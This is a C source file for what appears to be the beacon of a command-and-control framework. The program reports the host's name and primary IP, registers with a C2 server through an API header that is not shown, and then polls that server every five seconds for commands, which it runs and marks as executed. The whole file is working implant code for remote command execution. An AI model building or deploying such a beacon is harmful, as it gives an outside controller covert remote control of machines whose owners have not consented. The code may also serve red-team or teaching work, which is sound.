#include "c2api.h"
#include "c2json.h"
#include "c2types.h"
#include <arpa/inet.h>
#include <limits.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <unistd.h>

#define DEST_IP "8.8.8.8"
#define DEST_PORT 53

char* get_primary_ip()
{
    int sock;
    struct sockaddr_in dest_addr;
    struct sockaddr_in local_addr;
    socklen_t addr_len = sizeof(local_addr);
    char* ip_str = (char*)malloc(INET_ADDRSTRLEN);

    if (ip_str == NULL) {
        perror("malloc failed");
        return NULL;
    }

    // Create UDP socket
    sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) {
        perror("socket creation failed");
        free(ip_str);
        return NULL;
    }

    memset(&dest_addr, 0, sizeof(dest_addr));
    dest_addr.sin_family = AF_INET;
    dest_addr.sin_port = htons(DEST_PORT);
    inet_pton(AF_INET, DEST_IP, &dest_addr.sin_addr);

    // Connect the socket
    if (connect(sock, (struct sockaddr*)&dest_addr, sizeof(dest_addr)) < 0) {
        perror("connect failed");
        close(sock);
        free(ip_str);
        return NULL;
    }

    // Get the local socket name
    if (getsockname(sock, (struct sockaddr*)&local_addr, &addr_len) < 0) {
        perror("getsockname failed");
        close(sock);
        free(ip_str);
        return NULL;
    }

    // Convert IP to string
    if (!inet_ntop(AF_INET, &local_addr.sin_addr, ip_str, INET_ADDRSTRLEN)) {
        perror("inet_ntop failed");
        close(sock);
        free(ip_str);
        return NULL;
    }

    close(sock);
    return ip_str;
}

int main(int argc, char* argv[])
{
    char hostname[HOST_NAME_MAX];
    gethostname(hostname, HOST_NAME_MAX);
    printf("Beacon hostname: %s\n", hostname);
    char* ip = get_primary_ip();
    printf("Beacon IP: %s\n", ip);
    int id = register_beacon(ip, hostname);
    printf("Beacon ID: %d\n", id);

    while (true) {
        struct Command** commands = get_beacon_commands(id, true);

        if (commands[0] == NULL) {
            printf("No commands to run\n");
        }

        for (int i = 0; commands[i] != NULL; i++) {
            printf("running command %d\n", i);
            run_command(commands[i]);
            printf("%s\n", commands[i]->result);
            mark_command_executed(commands[i]);
            printf("marked executed\n");
        }

        printf("sleeping for 5 seconds\n\n");
        sleep(5);
    }
    return 0;
}
